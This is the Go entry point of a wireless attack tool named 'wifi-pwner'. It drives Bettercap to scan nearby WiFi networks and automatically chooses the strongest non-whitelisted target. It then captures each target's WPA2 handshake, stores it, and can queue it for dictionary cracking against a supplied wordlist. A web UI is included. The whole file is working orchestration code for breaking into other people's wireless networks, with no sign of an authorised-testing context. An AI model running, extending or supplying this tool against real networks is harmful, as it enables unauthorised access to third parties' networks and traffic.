package main

import (
	"flag"
	"log"
	"os"
	"os/signal"
	"path/filepath"
	"syscall"
	"time"

	"wifi-pwner/src"
)

func main() {
	if os.Geteuid() != 0 {
		log.Fatal("This program must be run as root")
	}

	// Get current working directory
	workingDir, err := os.Getwd()
	if err != nil {
		log.Fatalf("Failed to get working directory: %v", err)
	}

	// Parse command line flags
	var (
		iface     = flag.String("interface", "", "WiFi interface to use (required)")
		mode      = flag.String("mode", "2.4", "WiFi mode: 2.4 or 5 (default: 2.4)")
		clean     = flag.Bool("clean", false, "Clean everything, start fresh")
		bApiPort  = flag.String("b-api-port", "8081", "Bettercap API port (default: 8081)")
		bExpose   = flag.Bool("b-expose", false, "Expose Bettercap API on 0.0.0.0 instead of 127.0.0.1 (default: false)")
		webui     = flag.Bool("webui", true, "Enable web UI on port 8080 (default: true)")
		autocrack = flag.String("autocrack", "", "Path to wordlist file for automatic WPA2 handshake cracking")
	)
	flag.Parse()

	if *iface == "" {
		flag.Usage()
		log.Fatal("Error: --interface flag is required")
	}

	if *autocrack != "" {
		if _, err := os.Stat(*autocrack); os.IsNotExist(err) {
			flag.Usage()
			log.Fatalf("Error: wordlist file does not exist: %s", *autocrack)
		}
		if filepath.Ext(*autocrack) != ".txt" {
			flag.Usage()
			log.Fatalf("Error: wordlist file must be a .txt file: %s", *autocrack)
		}
	}

	config := &src.Config{
		Interface:          *iface,
		Mode:               *mode,
		Clean:              *clean,
		WhitelistFile:      filepath.Join(workingDir, "whitelist.txt"),
		BettercapAPIPort:   *bApiPort,
		BettercapApiExpose: *bExpose,
		WebUI:              *webui,
		WorkingDir:         workingDir,
		AutoCrack:          *autocrack != "",
		WordlistPath:       *autocrack,
	}

	if config.Clean {
		cleaner := src.NewCleaner(workingDir)
		if err := cleaner.Clean(); err != nil {
			log.Fatalf("Clean failed: %v", err)
		}
	}

	// Initialize database
	db, err := src.NewDatabase(workingDir)
	if err != nil {
		log.Fatalf("Database setup failed: %v", err)
	}
	defer db.Close()

	// Create output directory
	scannedDir := filepath.Join(workingDir, "scanned")
	os.MkdirAll(scannedDir, 0755)

	// Initialize bettercap
	bettercap := src.NewBettercap(config)
	if err := bettercap.Start(); err != nil {
		log.Fatalf("Failed to start bettercap: %v", err)
	}
	defer bettercap.Stop()

	// Initialize scanner
	scanner := src.NewScanner(config, db, bettercap)
	if err := scanner.LoadWhitelist(); err != nil {
		log.Printf("Warning: Failed to load whitelist: %v", err)
	}
	src.GlobalScanner = scanner

	// Initialize handshake capture
	handshake := src.NewHandshakeCapture(bettercap, db, workingDir)

	// Initialize cracker if enabled
	var cracker *src.Cracker
	if config.AutoCrack {
		cracker = src.NewCracker(db, config.WordlistPath)
		if err := cracker.LoadInitialTargets(); err != nil {
			log.Printf("Warning: Failed to load initial crack targets: %v", err)
		}
		cracker.Start()
		defer cracker.Stop()
		src.GlobalCracker = cracker
		src.SetCrackingEnabled(true)
	}

	// Start web server if enabled
	if config.WebUI {
		webserver := src.NewWebServer(db)
		webserver.Start()
	}

	// Setup signal handling
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-sigChan
		log.Println("\n[EXIT] Shutting down...")
		bettercap.Stop()
		os.Exit(0)
	}()

	log.Printf("[READY] Scanner started on %s", config.Interface)
	for {
		if !src.GetScanningEnabled() {
			time.Sleep(5 * time.Second)
			continue
		}

		if err := scanner.StartScanning(); err != nil {
			log.Printf("[ERROR] Failed to start scanning: %v", err)
			continue
		}

		time.Sleep(10 * time.Second)

		targets, err := scanner.GetTargets()
		if err != nil {
			log.Printf("[ERROR] Failed to gather targets: %v", err)
			continue
		}

		bestTarget := scanner.FindBestAvailableTarget(targets)
		if bestTarget == nil {
			continue
		}

		log.Printf("[TARGET] %s (%s) %ddBm", bestTarget.ESSID, bestTarget.BSSID, bestTarget.Signal)

		capFile, err := handshake.CaptureHandshake(bestTarget, scanner.GetChannelsForMode())
		if err != nil {
			log.Printf("[ERROR] %s", err)
			db.SaveTarget(bestTarget, "", src.StatusFailedToCap)
			continue
		}

		if capFile != "" {
			log.Printf("[CAPTURED] %s (%s)", bestTarget.ESSID, bestTarget.BSSID)
			db.SaveTarget(bestTarget, capFile, src.StatusHandshakeCaptured)

			if src.GetCrackingEnabled() {
				src.AddToCrackQueue(bestTarget.BSSID, bestTarget.ESSID, capFile)
			}
		} else {
			log.Printf("[FAILED] %s (%s)", bestTarget.ESSID, bestTarget.BSSID)
			db.SaveTarget(bestTarget, "", src.StatusFailedToCap)
		}
	}
}
